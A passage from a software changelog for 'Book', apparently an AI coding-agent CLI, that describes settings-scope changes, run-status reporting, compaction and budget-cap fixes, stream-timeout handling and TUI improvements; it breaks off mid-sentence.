# Changelog

All notable changes to this project are documented in this file.

## [Unreleased]

### Changed

- **`book config set` now writes the user-global layer by default, so a setting follows you instead
  of the directory you happened to be in.** It previously wrote `<workspace>/.book/settings.local.json`
  unconditionally, with no way to ask for another layer: the same preference had to be re-set in
  every checkout, and because the local layer resolves *last*, a stray value left in one silently
  outranked a later deliberate one. `--project` and `--local` reach the two workspace layers,
  `-g`/`--global` states the new default explicitly, and more than one scope is an error. A
  user-global write that a workspace layer still shadows now reports it rather than looking inert.

- **TUI preferences are saved by whose choice they are.** Effort, compact model, thinking display,
  startup animation, and memory auto-capture moved from the project-local layer to the user-global
  one, joining model, provider registries, API keys, and the permission default mode. Skill
  overrides, approved permission rules, per-profile agent models, and the theme stay project-local:
  those are about the repository, and a theme name can come from a project's `.book/themes`, where
  it would not resolve elsewhere.

### Added

- **`book status` reports whether a run is alive, and how it ended.** Book has been writing a
  liveness record to `<BOOK_HOME>/runs/<session-id>.json` at every turn boundary -- pid, turn,
  elapsed, spend against budget, current todo, last tool, free disk, and a terminal or crash outcome
  -- and nothing outside its own test read it. `book status` reported objective, history, tokens,
  cost, and todos from the session JSONL, and so could not answer whether the process was alive,
  which turn it was on, or whether it finished cleanly. A 20-minute print run that completed its work
  correctly and one that died at turn 16 on a stalled stream looked identical from outside; the only
  way to tell them apart was `jq` on a file with no documented reader.

  The record is now folded into `book status`, which already existed, needs no credentials, and is
  the surface a person looks at. The headline is one of four: `running` when the pid answers,
  `finished` with the terminal status and reason, `crashed` when the process died recording no
  outcome, and -- the case the record exists for -- *no longer running, and recorded no outcome*. A
  live process that has not reached a turn boundary in fifteen minutes is named as possibly wedged,
  since a transcript's mtime advances at the same rate for a healthy run and one stuck on a
  permission prompt. `--json` carries the same fields under `run`.

- **`book config unset <key>`** removes a key from one layer, so a shadowing value can be cleared
  with the tool that reported it rather than by hand.

- **`book config get`/`list` take a scope.** Without one they still report the resolved merge;
  with `--global`, `--project`, or `--local` they read that single file verbatim, which is what
  answers "why is this not the value I set".

### Fixed

- **`--effort` is validated like every other effort input.** `BOOK_EFFORT` was checked against the
  level list and `settings.effort` against its schema, but the flag was a bare cast — so a typo was
  forwarded to the provider as `reasoning_effort` / `output_config.effort` and came back as an
  opaque HTTP 400 for a mistake the CLI could name exactly. It is now rejected at parse time, with
  the valid levels listed, and the list itself is derived from the settings schema rather than
  restated a third time.

- **The repository no longer pins a model for its contributors.** The checked-in
  `.book/settings.json` set `model: "qc/qwen3.7-max"` -- a bare model id whose `qc/` prefix names
  no provider this repository configures. Project scalars outrank the user layer, so every clone
  had a working `~/.book/settings.json` model overridden by the checked-in one, resolved against
  the default OpenAI base URL, and reported the mismatch as a missing credential. Choosing a model
  belongs to the user layer or `--model`, so the file is gone.

- **A reasoning model on an OpenAI-compatible endpoint no longer dies at the 20-second chat stall
  ceiling.** `retry.thinkingStallTimeoutMs` (15 minutes) was applied on the Anthropic path only, so
  the same high-effort run that survives against Anthropic was cancelled mid-thought against a
  router and reported as `stream_stall` — and `BOOK_STREAM_STALL_TIMEOUT_MS` is clamped to 120 s, so
  no workaround could reach the ceiling the other path gets by default. Endpoints that buffer a
  whole thinking block send nothing until it is done, which is exactly the shape the chat ceiling
  reads as a dead stream. A request now gets the thinking ceiling when it sends `reasoning_effort`
  or when the model's catalog entry declares an effort range; `effort: false` and models with no
  entry keep the chat ceiling.

- **`book -p` reads the prompt from stdin, as its help has always said it does.** Stdin was consumed
  only for `--input-format stream-json`, so `book -p < prompt.txt` failed with `text input format
  requires a prompt` on a prompt it had just been handed -- and the error never mentioned
  `--input-format`, so it read as "you passed no prompt". The obvious way to drive Book from a
  script now works, and long prompts no longer have to be interpolated into argv. The flag still
  wins when both are given, a terminal is never read from (an interactive `book -p` would have hung
  instead of reporting the usage error), and the error now names all three ways to supply a prompt.

- **An unresolvable provider prefix in a model id is reported instead of silently falling back.**
  `model: "qc/qwen3.7-max"` with no `qc` provider configured resolved against
  `https://api.openai.com/v1` -- an endpoint the user never chose, for a vendor that has never
  heard of the model -- and said nothing. The only symptom was a separate `Credentials: not
  resolved` line, which sends the user looking for a missing key rather than a misspelled provider
  id. It still resolves rather than throwing, because `meta-llama/llama-3-70b` is the same spelling
  and a legitimate model name; the warning is raised only once providers are configured and the
  prefix matches none of them. Surfaced on stderr at startup and inline in `book doctor`, above the
  credentials line it used to be mistaken for.

- **`book doctor` can now get past, and point at, the settings layer that breaks it.** It listed all
  three layers as present and marked none of them as the source of the offending value, so finding
  it meant `jq`-ing all three by hand -- and `--no-settings`, declared on the root command and on
  `book config`, was not declared on `doctor`, so there was no way around the layer either. Doctor
  now resolves cumulative prefixes of the layer stack and marks the layer the failure first appears
  with, or says plainly that no single layer accounts for it when the cause is an environment
  variable. `book doctor --no-settings` reports the rest of the diagnostic with every layer skipped,
  and marks them `[-]` rather than `[ ]`, which would claim the files do not exist. The closing
  advice is the flag rather than repointing `BOOK_HOME`, which was heavier and did not help when the
  bad layer was in the workspace.

- **`book config set` can no longer write a settings pairing that makes every command fail at
  load.** It validated the single layer it was writing, which does not determine the effective
  configuration -- so it accepted `harness.workflow` while the effective `harness.mode` was the
  `off` default, a combination the loader then rejects. The write succeeded and every subsequent
  invocation, including the `book config` that would undo it, failed before it started; recovery
  meant hand-editing JSON. The candidate layer is now resolved through the real merge and put
  through the loader's own assertions, so the check cannot drift from what actually rejects a
  configuration, and it sees pairings that span layers in both directions -- a workflow is accepted
  when the enabling mode lives in another layer, and a mode is refused when it would disable a
  workflow another layer selects. A configuration that was *already* broken stays writable: only a
  write that introduces the failure is refused, because repairing one is the reason to run the
  command.

- **`book config` no longer fails on the configuration it exists to repair.** It resolved the merged
  settings on every invocation, so one malformed layer made every subcommand throw -- including the
  read that would have identified the broken file and the write that would have replaced the bad
  value. The merge is now resolved only for the reads that need it, and a scoped read reports an
  unreadable layer as unreadable rather than as empty.

### Fixed

- **A no-op compaction no longer runs the user's `PreCompact` hooks.** Deciding whether there is
  anything to summarize is pure and cheap, but it ran *after* the hooks — so every compaction
  attempt that immediately returned `too-short` had already executed whatever shell commands
  the user configured. On a long run the auto-compaction check fires repeatedly near the threshold, and
  a hook with a side effect (a commit, a notification, a snapshot) was being fired each time for a
  compaction that never happened. The emptiness check now runs first.

- **A checkpoint quoting a build error is no longer rejected as a hallucination.** The reducer is
  shown each message serialized with its reasoning, tool arguments, tool-result bodies, and file
  observations, but its quotes were validated against the message's `content` alone. So a faithful
  quote of the exact thing worth remembering -- a compiler error, a failing assertion, a command's
  output -- failed validation, burned the single repair attempt, and dropped the whole generation
  to the degraded fallback. Quotes are now checked against the same bytes the reducer was given.

- **A 31st touched file no longer throws away the whole checkpoint.** The 30-file cap was a schema
  rule, so exceeding it failed the parse rather than trimming the excess -- spending the repair
  attempt and degrading the generation. Worse, the same rule ran when *re-reading* a prior
  checkpoint from history, so an over-long checkpoint silently stopped being recognized as one and
  every inherited fact in it was discarded. The cap is now a host trim applied before validation,
  keeping the newest entries.

- **One bad reducer reply no longer erases the objective.** When a generation could not be parsed,
  the deterministic fallback cloned the prior checkpoint -- keeping its constraints, files and
  episodes -- and then overwrote `state.summary` with a notice, so the accumulated narrative of
  every generation before it was replaced by the reducer's unusable output. A run compacting
  repeatedly over days lost what it was doing to a single malformed response. The notice is now
  appended to the inherited summary, and the inherited text absorbs any truncation so the
  retrieval instruction always survives.

- **The compaction reducer is no longer cut off mid-JSON by its own budget.** Its provider
  `max_tokens` was set to the checkpoint *content* budget, so the model had to fit a whole JSON
  envelope into the space allotted to the text inside it -- and on an adaptive-thinking model the
  thinking is spent from that same cap, with no compaction exemption. The cap is now derived above
  the content budget, bounded by the model's own output limit and by the room the summarizer's
  input leaves in the window. A reply that still stops at the cap is recognized as truncated
  rather than malformed, so it no longer spends the single repair attempt on a longer prompt that
  could only overrun again.

- **Compaction no longer compresses the same text once per chunk.** `fitCheckpoint` ran inside
  `parseAndValidateCheckpoint`, which runs once per chunk of a multi-pass reduction -- so in a
  K-chunk plan the first chunk's checkpoint was fitted K times, again in the post-budget loop, and
  again at every future generation. The ladder is lossy and restarts at 512 characters each time,
  so a constraint stated once in full was truncated, then the truncation truncated, until it was
  dropped outright: a regression test shows a verbatim constraint disappearing from the second
  chunk's prompt entirely under the old order. Fitting now happens once, at the end, where it is
  already followed by validation and a deterministic fallback.

- **A context overflow under Zero-Mem is recoverable again.** The experiment disabled routine
  auto-compaction, which is intended -- but it also nulled the loop's `onCompact` callback
  entirely, and the loop's context-overflow recovery is deliberately *not* gated on the
  auto-compaction setting. So the one path that exists to rescue a turn the provider has already
  refused for size could never run, and `AgentSession.compact` would have answered it by warming a
  search index in any case. An automatic attempt now runs the real compactor; `/compact` still only
  warms the index.

- **The compaction fidelity warning means something again.** Checkpoint `coverage` merged the prior
  generation's status and reasons into the current one, so a single degraded generation marked
  every generation after it for the life of the conversation -- and on a long run that happens
  within hours, after which "compacted with reduced fidelity" is permanent and carries no
  information. `coverage.status` and `coverage.reasons` now describe the generation that just ran,
  and a new optional `coverage.lifetime` carries the accumulated record so nothing is forgotten.
  Stream-JSON `compact` records gain `coverage_lifetime_status` alongside `coverage_status`. The
  checkpoint version stays `2` and no reason enum gained a member, so an older binary reading one
  of these checkpoints still sees a valid v2 document.

- **Compaction fidelity is measurable, and the first measurement is bad.** There was no fidelity
  metric at all, so every quality claim about compaction -- including the ones in this changelog --
  was unfalsifiable. `src/agent/compact-fidelity.ts` scores a completed multi-generation run
  (retention, generational loss order, supersession correctness, source grounding, retention
  precision, reducer calls, post-request utilization) with no provider in the loop, against the
  tagged planted-fact corpus now shared with `npm run eval:compact`. The recorded v2 baseline over
  eight generations: **only the newest third of planted facts survive, the oldest go first, and
  retention of the user's own opening constraints is zero.** Those thresholds are now asserted in
  the unit tier and move upward only.

- **Compaction's enlarged reducer cap can no longer overflow a multi-chunk reduction.** Fitting once
  at the end means the rolling checkpoint that seeds the next chunk's prompt is bounded by the
  reducer's output cap rather than by the smaller budget the plan reserved for it, so the two
  changes together could push a chunk request past the context window. The cap is now bounded by
  the arithmetic that keeps the worst-case request plus its own output inside the window.

### Added

- **A run says what it is doing while it does it (`<BOOK_HOME>/runs/<session>.json`).** Rewritten at
  every turn boundary with turn, elapsed, spend, the current todo, the last tool, free disk, and the
  terminal outcome once there is one. Until now the choice was silence or a firehose: the default
  `--output-format text` emits nothing at all until a run terminates, and the only other on-disk
  signal is the transcript's mtime — which advances at exactly the same rate for a healthy run, a
  refusal spin, and a run wedged on a permission prompt. Written temp-file-then-rename so a reader
  never sees a torn record, and rewritten rather than appended so it stays bounded over a week.
  This is the writer half of what `book status` will read.

- **A crash leaves a record.** There was no `uncaughtException` or `unhandledRejection` handler
  anywhere, and `index.ts` ends in a bare `program.parse()` whose promise nothing awaits — so when a
  long run died the operator got a stack trace on a stderr they may have redirected days ago, and
  nothing durable said why. The status file now carries a `crash` field written from the exit path,
  which is what distinguishes "finished the objective" from "the socket died".

- **Free disk space is observable.** Nothing in the codebase could see it, yet a long run's most
  likely hard failure is ENOSPC and a disk-below-floor alarm needs a sensor to read.

- **The model is told how long it has been running.** The only temporal signal in the whole prompt
  was a UTC calendar date at day granularity, so a model five days into a week-long objective could
  not distinguish that from turn 3 — it could not pace itself, notice it had been circling the same
  file since Tuesday, or honour a time-bounded instruction. `<session-state>` now carries a coarse
  `Running for:` line, suppressed when an evaluator has frozen the date so equivalent arms still get
  byte-identical prompts.


- **A brake that a spinning run cannot forge (`continuation.blockedToolTurnLimit`).** A run whose
  every tool call is refused now stops as `all_tools_blocked`, naming the tools to unblock. This
  spin was invisible to everything: it never produces a tool-free turn, so the turn-end gate and
  every brake behind it never fire; `noteRepeatedFailure` ignores anything that is not an `error`;
  and `toolCallStats.failures` excludes `blocked` by construction. Headless answers every unresolved
  prompt `deny`, so in the default permission mode an unattended run would re-issue refused calls
  until the budget died. Enforced even with `continuation.enabled` false, because the spin predates
  continuation and needs none of it. `0` disables.

- **The no-progress witness no longer counts refused calls as progress.** It drew its tool-call leg
  from `toolCallStats`, which increments for *every* attempted call including refusals — so in a
  denial or policy-block stall the single leg meant to prove nothing had moved was guaranteed to
  move, while the todos, the file ledger, and the done-check all stayed frozen. The witness now
  counts only calls that actually ran. Until now this was masked by the run ending at the model's
  first tool-free turn; the continuation driver removes exactly that mask.

- **A deliberate stop is distinguishable from success.** Terminal reasons gain `plan_stop` and
  `handoff_requested`; both previously exited `completed / normal_completion`, byte-identical to a
  finished objective, and the approver's message explaining a plan stop was discarded. The status
  stays `completed` — neither is a failure — so only the vocabulary changes.

- **A restart re-drives the agents that died with it (`agents.resumeInterrupted`).** `AgentManager`
  already hydrated agents, plans, evidence, and snapshots on start — it just never pushed anything
  onto its queue, which is a bare array written only at spawn and retry. So a reboot mid-fan-out
  converted the entire pending backlog into `interrupted` records nothing ever picked up, silently
  discarding hours of child work. Recovery now records *why* an agent stopped (`resumable` plus the
  status it held), and the next start re-queues only those that died by process exit; a user stop
  stays stopped. The re-drive is contained — explorers are read-only and patchers run in their own
  worktree, so nothing reaches the parent workspace without the usual evidence gate.

- **A `Stop` hook can now refuse a premature completion.** `Stop` joins the blocking events, and
  under `continuation.enabled` a blocked completion becomes another turn carrying the hook's reason
  instead of ending the run. A hook's `block` was previously collected and discarded, which made
  "do not consider this finished until `npm run check` passes" inexpressible from outside the
  process. The gate runs once, before the objective is declared complete, and suppresses the
  duplicate `Stop` that would otherwise fire on the way out.
- **`AgentList` and `AgentRead` now show what an agent was *for*.** `purpose` (bounded to 200
  characters) and `planId` join the agent summary. The root previously saw rows of
  `patcher-3 / interrupted / <no summary>` while both fields sat unused on disk — and after a
  compaction or two that row is all a parent has left of a delegated unit of work.

- **`book status` — what a run is doing and what it has spent, without a credential.** Reports the
  byte-exact original objective, message and compaction counts, cumulative tokens and an upper-bound
  USD figure, and the restored plan, for the newest session in a workspace or one named by id or
  name. `--json` for a supervisor. The objective is read from the transcript rather than a summary
  because the transcript is never rewritten by compaction, so the user's first words survive verbatim
  however many generations have passed. Credential-free by construction and asserted in
  `subcommands.contract.test.ts` — a run whose provider is misconfigured is exactly when someone
  needs to read its state.
- **`Notification` hook event.** Fires when something wants a human while nobody is watching, with
  `severity` (`alarm`/`warn`/`info`), a machine-readable `kind`, and a message. Only `alarm` is meant
  to wake anyone. Wire ntfy, Slack, or SMS as an ordinary shell hook.
- **Worktree admission control (`agents.maxWorktrees`, `agents.minFreeDiskBytes`).** A wide fan-out
  on a large repository is the one failure that takes the whole run down rather than one agent:
  worktrees share the filesystem with the workspace, so exhausting it breaks the root agent's own
  `Edit` and `Bash`. Nothing reclaimed them automatically — `AgentManager.dismiss` has exactly one
  caller, a TUI keypress, so print mode, the SDK, and any supervised runner reclaimed nothing ever,
  and the store's retention sweep runs once at startup with a 30-day default that cannot fire inside
  a week-long run. A spawn is now refused *before* it consumes the last of the disk, with a typed
  reason and an `alarm` notification. Per-worktree byte accounting is deliberately not attempted: it
  is an O(files) walk on every spawn and stale the moment a build writes, while free space is the
  quantity that matters and costs one syscall.

- **`continuation` — a run can outlive one user message.** `runAgentLoop` ended as soon as a turn
  produced no tool calls, so one user message was the whole run and a model that wrote "I've
  finished the auth module" exited as a normal completion with half its plan outstanding. With
  `continuation.enabled` the loop instead appends a host-authored user turn naming what is still
  open and keeps going in the same invocation, so the tool context and todo list survive and the
  session-state block is re-rendered fresh at every boundary. It never continues past an abort, an
  approved plan handoff, a spent budget, or a policy refusal.

  Shipping with it, and not optional: a no-progress brake. Continuation without one is strictly
  worse than neither, because today a stalled run stops and a human notices. The brake compares a
  witness built from the todo list, observed-file hashes, and the tool-call count across
  continuation boundaries; `continuation.noProgressLimit` identical witnesses in a row ends the run
  as `no_progress` rather than spinning overnight against the budget. A plan whose every remaining
  task is blocked by unfinished work reports `blocked_plan` rather than being mistaken for success.

  Also new: every `continuation.planRefreshTurns` turns the host restates the open plan as a user
  message. That keeps the plan from going stale across a long tool-grinding stretch, and it is the
  only *guaranteed* source of compaction bundle boundaries — a run that grinds tool calls never
  stops, so it never triggers a continuation either, and without it the compaction candidate span is
  all-assistant and the retained tail is unconditionally zero from generation 2 onward.
- **`agents.checkTimeoutMs` bounds a `Check` run, and a timeout is no longer reported as a
  failure.** The ceiling was hardcoded at 120 s, and `exec` signals a timeout by killing the child —
  which arrived through the same path as a non-zero exit. On any repository whose suite runs longer
  than two minutes (this one builds first, so `npm test` always does), every `Check` reported a
  failing suite that had in fact never finished, inviting an agent to "fix" passing code. A timeout
  now returns a distinct, retryable `check_timed_out` that names the command and the ceiling, and
  the ceiling is configurable from 1 s to 2 h.
- **The plan now survives a restart.** Todos were the only long-horizon state with no home
  anywhere: the loop seeded `ToolContext.todos` from a fresh `[]` on every invocation, TodoWrite
  reassigned rather than mutated, and nothing wrote them to disk. Worse, an empty task list renders
  as no list at all, so a dropped plan was indistinguishable from a task that never had one and the
  model silently re-derived instead of deliberately rebuilding. Todos now live on `SessionRuntime`
  beside the task graph, TodoWrite mutates that array in place, and both persist as a whole-plan
  `plan` session record (last record wins) that `--resume`, `--session-id`, and `fork` all restore.
  Older binaries ignore the record rather than breaking on it. When a session resumes with prior
  work and no plan, `<session-state>` says so explicitly instead of rendering nothing.

- **Eye-friendly built-in themes.** Added `catppuccin` (Catppuccin Mocha pastel palette for minimal eye fatigue), `nord` (Arctic glacial slate for reduced blue-light glare), `gruvbox` (warm retro-earthy dark palette with amber and olive tones), and `solarized-dark` (scientifically tuned Lab color space contrast). All four themes are selectable via `/theme` picker and direct slash commands (`/theme <name>`).

### Fixed

- **`--include-partial-messages` did nothing, and forced maximum stream volume.** Commander leaves an
  unpassed boolean `undefined` and the gate was `!== false`, so every stream-json run emitted every
  assistant and reasoning delta whether or not anyone asked. It is now the opt-in it always claimed
  to be.

- **`--max-budget-usd` is a cap again, for four independent reasons it was not.**
  (1) It was enforced against the root execution's *own* cost, never the inclusive
  figure, so every dollar spent by managed agents and subagents was invisible to it —
  the same snapshot would report `budgetStatus: 'exceeded'` while the pre-call check
  returned `{allowed: true}`. Snapshots now carry `inclusiveCostUsd` and the gate
  enforces against it. (2) The flag was parsed with an unvalidated `parseFloat` behind
  a truthiness guard, so `--max-budget-usd none` produced `NaN` — which is not
  `undefined`, so the budget read as *configured* while every comparison against it
  was false, and `0` was falsy so an explicit zero cap meant unlimited. Both flags are
  now validated at the boundary and the check fails closed on a non-finite ceiling.
  (3) Headless mints a fresh root per submitted prompt and re-seeded the full budget
  into each, so a hundred stream-json prompts under a $50 cap authorised $5000 in one
  process; spend now carries between prompts through the same seam that carries it
  between processes. (4) `snapshotAll` reported a budgeted run as `not_configured` as
  soon as a second root existed.

- **The budget check no longer gets slower for the life of the run.** `modelIdentities`
  grew one entry per provider response, per retry and per compaction — and its dedupe
  predicate could never match an identity with no `responseId`, so those were appended
  unconditionally. Both `record()` and `makeSnapshot()` then linear-scanned it per
  element, and `makeSnapshot` runs inside `checkBeforeModelCall` before *every* model
  call: quadratic work on the hot path of the spend rail, measured at 8.4 s per call by
  40k responses. The set is now keyed by the identity tuple its only consumer actually
  reads, which bounds it to the distinct model/provider/status combinations.

- **`--max-turns` no longer runs zero turns and reports success.** `parseInt('none', 10)`
  is `NaN` and `'none'` is truthy, so the typo passed the guard; every disjunct of the
  turn guard is false for `NaN`, so the loop body never ran and the run exited
  `completed / normal_completion` having made no provider call and written no output.


- **A thinking model no longer gets cancelled mid-thought.** `retry.streamStallTimeoutMs` is 20
  seconds, which is right for a chat: that much silence means something broke. But adaptive thinking
  is on by default for every Opus and Sonnet model here, at `high` effort unless told otherwise, and
  a long quiet stretch before the first token is the model working. The chat ceiling was applied to
  it anyway, so a healthy high-effort request was cancelled and reported as `stream_stall` — the most
  common way an Opus run appears to "just stop". Thinking now has its own ceiling,
  `retry.thinkingStallTimeoutMs` (default 15 minutes, `BOOK_THINKING_STALL_TIMEOUT_MS`), applied only
  while thinking is enabled; the chat timeout is unchanged everywhere else.
- **Claude Opus 5 is selectable and priceable.** `provider/anthropic.ts` already listed
  `claude-opus-5` as an adaptive-thinking model, so Book sent it thinking parameters — but it was
  missing from both the model picker and the pricing table. With a USD budget set, `hasKnownPricing`
  returned false and `checkBeforeModelCall`, which fails closed, refused **every** call: choosing
  Opus made the run stop before it started. It now appears in `/model` and carries the Opus family
  rate (re-verify against published pricing before a release).
- **Undated model aliases resolve to their dated entry.** `claude-haiku-4-5` was unpriced because
  the table only held `claude-haiku-4-5-20251001`, and the alias is what a person types. Pricing now
  resolves an alias to its dated entry when exactly one candidate matches — a bare family name like
  `claude-opus` stays unknown rather than being guessed at a generation.
- **A rejected credential parks instead of burning every retry.** 401/403 and 402 surfaced as a
  generic provider error, which the new transport recovery treats as re-issuable — so an invalid key
  was re-sent until the attempts ran out, and the run then reported a transport fault rather than the
  real cause. They now produce `credentials_rejected`, which is classified `park`: not retried,
  reported honestly, and escalated through the `Notification` hook so a supervisor can wait for a new
  key rather than tear the objective down.
- **A USD budget no longer refuses the run it is meant to bound.** Two independent faults made
  `--max-budget-usd` unusable against Anthropic. No Claude entry in the pricing table declared a
  `cacheRead`/`cacheCreation` rate, and Book sets `cache_control` on every Anthropic request — so
  from the first cached turn every estimate returned `cache-pricing-unavailable`, and
  `checkBeforeModelCall`, which fails closed on unknown pricing, refused every subsequent call.
  Separately, a provider attempt that reported no usage latched the run's cost status to `unknown`
  and nulled the accumulated cost; since that fires from the provider's `onRetry`, one transient
  429 permanently disabled the budget, making the reliability layer and the only spend rail
  mutually exclusive. Cache rates now ship for every Claude entry, and missing attempt usage
  degrades to `estimated` — a lower bound the budget still enforces against — while staying visible
  through `completeness`, `unknownModels`, and `missingSources`. A genuinely unpriceable model still
  fails closed.
- **Dated model ids are priced from their family.** Providers routinely resolve an alias to a dated
  id (`claude-sonnet-5` → `claude-sonnet-5-20260115`), which the table missed entirely; combined
  with the fail-closed budget gate, that turned a routine provider-side rename into a refused run.
  Pricing now falls back to the longest table key the id extends at a separator boundary, so
  `gpt-5` cannot claim `gpt-51`, and `/cost` and `/usage` resolve the same way instead of printing
  "pricing unknown". `estimateUsageCost` and `hasKnownPricing` also accept a per-model override map.
- **A USD budget survives a restart.** `RunAccounting` was rebuilt with the process, so forty
  restarts meant forty independent caps. Provider usage is now written to the `usage` session record
  type (declared long ago with no writers) and summed back at bootstrap, so `--max-budget-usd`
  bounds the objective rather than one process. Only tokens are stored — pricing changes between
  processes — and the restored total is re-priced at the most expensive model involved, keeping it
  an upper bound, which is the safe direction for a ceiling.
- **A dropped stream no longer ends the run.** Every stream failure mapped straight to a terminal
  outcome and returned, so a twenty-second provider silence, a closed socket, or a suspended laptop
  killed the turn — and `retry.maxAttempts` could not help, because it covers connection setup only
  and is out of scope once a 200 response is streaming. The loop already committed everything needed
  to recover and then discarded it: the partial assistant message is persisted, and every dangling
  `tool_use` is settled with a `cancelled` result, so the history stays valid to the provider and no
  tool re-executes. A transport fault now re-sends the turn onto that history, bounded by
  `retry.streamReissueAttempts` (default 3) with exponential backoff; set it to 0 to restore the
  previous behavior exactly. Which failures qualify is decided by one `terminalRecovery()`
  classifier — a budget, a policy block, a cancellation, or a context overflow is still a genuine
  end — and when the attempts are spent the original diagnosis is preserved rather than replaced.
  Hitting `max_tokens` now produces an `output_cap` reason instead of `protocol_error`, with its own
  `retry.outputCapContinuations` allowance so a large generated file cannot drain the budget a real
  socket drop needs.
- **`Stop` and `SessionEnd` fire on every path, and say why the run stopped.** Both were skipped by
  each early return — a blocked prompt, a context overflow, a spent run budget, an unrecoverable
  stream error. That gap was defensible for a session a human is watching; it is not when a shell
  script is the only observer and cannot otherwise distinguish "finished the objective" from "the
  socket died". They now fire from a `finally`, exactly once, carrying the settled terminal status
  and reason.
- **The spinner keeps its own hue in every built-in theme.** Five of the six themes anchor
  `shimmerPair` on `assistantAccent` — the agent's own colour — and ease to a lighter tint of it.
  Nord shipped the pair transposed, so it started on `brand`, and Catppuccin ended its breath on
  `brand`. Since `brand` is product chrome, and the plan block and the activity row sit on adjacent
  footer rows, the working line rendered in the plan header's colour: identically in Nord under
  reduced motion, and once per breath in Catppuccin. Both pairs now follow the convention, and a
  test over every built-in theme asserts `shimmerPair[0]` is `assistantAccent` and that neither end
  lands on `brand`, so a new theme cannot reintroduce the collision silently.
- **Mouse scrolling, clicking, and copying now work together.** Full-screen mode uses SGR
  button-event tracking for three-row wheel scrolling, click-to-expand tool summaries, and
  Claude Code-style drag selection: exact character ranges highlight during a drag, copy to the
  system clipboard on release, and remain visibly selected until the next interaction. Shift+drag
  remains available for terminal-native selection. Book clears stale mouse modes before enabling
  its narrow tracking mode and clears them all on exit; alternate scroll (`?1007`) stays disabled
  during the session so a wheel nudge cannot become an input-history arrow. Every text field still
  strips mouse reports and re-seats its cursor, so clicks and drags can never become prompt, URL, or
  API-key text.
- **A run that stops mid-task now says why.** Three faults compounded into a session that simply
  stopped after a tool result and handed the prompt back, with nothing in the transcript and nothing
  in the session file to say a request had failed. Reasoning is not always delivered out of band:
  OpenAI-compatible routers commonly inline it into `content` as `<think>…</think>`, and only the
  TUI renderer knew to strip those tags. The loop's empty-completion guard tested the raw string, so
  a turn whose entire output was an empty reasoning block measured fifteen characters, never
  retried, and ended the run as a normal completion — the guard was dead code against such a
  provider. The same guard was gated on the stream having reached its terminal event, so a router
  that closed the socket early skipped it too. And a provider error reached the TUI through a branch
  that only wrote to a debug logger that is off by default, while the loop's error path skips
  `onAssistantMessageComplete` — the sole writer to the session store — so neither the failure nor
  the half-answer that preceded it survived to explain the stop. Reasoning-tag splitting now lives
  in `src/reasoning-tags.ts`, shared by the loop and the renderer; the loop measures a turn's answer
  with the tags removed and retries once whether the stream ended cleanly or was cut short,
  preserving a transport diagnosis rather than replacing it with a generic one. The emptiness test
  reads only tags the provider actually closed, so an answer that merely opens with an unfenced
  `<thinking>` is not mistaken for silence. Partial output is now persisted before the loop reports
  the failure, and the failure itself is written into the transcript — keyed on the run's settled
  outcome, not on any error event, so a problem the run recovers from (a skill that fails to
  activate) no longer stamps a failure notice onto a turn that succeeded, and it replaces the
  transient banner rather than doubling it. What went wrong is visible when it happens and still
  there after `--resume`.
- **A finished answer no longer vanishes into a collapsed thought.** The renderer reads a reasoning
  tag the provider never closed as reasoning running to the end of the message, which is what keeps a
  thought out of the answer while it streams. On a settled message that reading is a trap. An
  OpenAI-compatible router replays a turn's out-of-band reasoning back into history wrapped in
  `<reasoning_context>` tags, and a model that sees the convention starts emitting it — inconsistently
  closed. One such turn opened the tag, wrote a complete report, and never closed it, so the
  transcript filed all fourteen thousand characters as a single thought and collapsed it to one dim
  `thought` row: indistinguishable from an agent that quit mid-task. The loop had already learned this
  lesson — its emptiness test reads only tags the provider actually closed — but the renderer had no
  matching guard, so the two disagreed about whether the turn had answered. `splitReasoningParts` now
  takes `concluded`, and a turn that is complete and called no tools reads an unterminated block back
  as answer text, exactly as the loop already does. Both halves of that condition carry weight: a turn
  that called a tool has not finished speaking and was never at risk, and promoting its narration
  would publish a thought the reader had collapsed — past `showThinking`, since promoted text renders
  as markdown and no longer meets that gate. The dangling tag itself is dropped rather than shown,
  because `marked` renders raw markup as a fenced `html` block and would bury the recovered answer a
  second time.
- **A stream that dies mid-tool-call no longer wedges the session.** A cut stream can carry a
  finished tool call the loop never got to run. `buildMessages` puts `tool_calls` on the assistant
  message but emits results only for calls that have one, so that dangling call made every later
  request malformed — Anthropic rejects a `tool_use` with no matching `tool_result` — and persisting
  it carried the breakage past a `--resume`. Abandoned calls are now settled with a cancelled result
  the way an interrupt settles them.
- **A retried turn no longer shows the attempt it threw away.** Deltas reach the host as they
  arrive and cannot be recalled, so when the loop abandoned an attempt and retried, the abandoned
  reasoning sat in front of its replacement while only the replacement was persisted — the live view
  and a resumed view disagreed. The loop now emits `attempt_discarded` (new optional
  `onAttemptDiscarded` callback, and a `stream-json` event of the same name) and the TUI clears the
  streamed text for that turn. Holding the deltas back instead was rejected deliberately: it would
  render a long thinking phase as silence, which is the symptom this whole area exists to stop.
- **Tool rows sit under the prose that ordered them.** A top-level tool row hung its status
  glyph at column 0 while prose began at column 2, so a turn read as a list of tool calls with
  sentences wedged between them — the prose indented from a margin the glyphs owned. Tool rows and
  managed-agent blocks now carry their gutter one level in, and the grid narrows by exactly what it
  shifts, so every row keeps its right edge and right-aligned metadata still lines up down the
  transcript.
- **The working indicator's elapsed time rolls up into minutes and hours.** The row rendered a raw
  second count, so a long turn read `248s` — a figure the reader has to divide before it means
  anything. It now uses the same duration formatter as subagent rows, background shells and tool
  rows: `4m 8s`, and `1h 2m 3s` once a turn passes an hour.
- **`/review` shows its work instead of going silent for minutes.** The command was dispatched
  fire-and-forget: it set no state, so no spinner ran; its agents were spawned with no
  `parentSessionId`, so the session's agent panel and status line filtered every one of them out;
  and the pipeline emitted its first segment only after the whole run finished. A `--deep` review
  was up to twenty minutes of a prompt that looked idle. The run now announces its resolved target
  — file count, base, path scope, and which passes are coming — before the first agent starts, and
  every reviewer, lens, verifier and patcher appears live in the agent panel while it works.
  Ownership was conflated with delivery: agents can now be owned by a session for display while
  suppressing the completion notification separately (`notifyParentOnCompletion`), so live progress
  costs no extra model turn to re-narrate a report the host already rendered. Progress goes only to
  a host that renders as segments arrive, so `book -p /review` stdout is unchanged — a print run has
  no silence to break, and the announced target is already on `data.target`.
- **A review is scoped to the conversation that asked for it.** Nothing cancelled a running review
  when the session was replaced, so after a `/new` its report was appended to a conversation that
  never requested it, its agents were invisible (they belong to the old session), and it still held
  the single-review slot, refusing a `/review` typed in the new one.
- **A local message produced mid-turn is deferred, not discarded.** `addLocalMessage` returned early
  whenever a send was in flight, which was correct about not clobbering a streaming turn and wrong
